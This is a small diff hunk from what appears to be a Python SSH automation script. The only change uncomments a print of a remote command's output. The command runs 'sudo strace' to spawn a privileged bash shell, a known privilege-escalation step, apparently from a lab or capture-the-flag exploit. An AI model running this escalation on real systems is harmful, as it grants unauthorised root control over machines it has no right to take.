@@ -51,7 +51,7 @@ try:
     time.sleep(3)
     
     stdin, stdout, stderr = client.exec_command("sudo /bin/strace -o /dev/null /bin/bash -p", get_pty=True)
-    # print(stdout.read().decode())
+    print(stdout.read().decode())
     # print(stderr.read().decode())
     
     time.sleep(5)
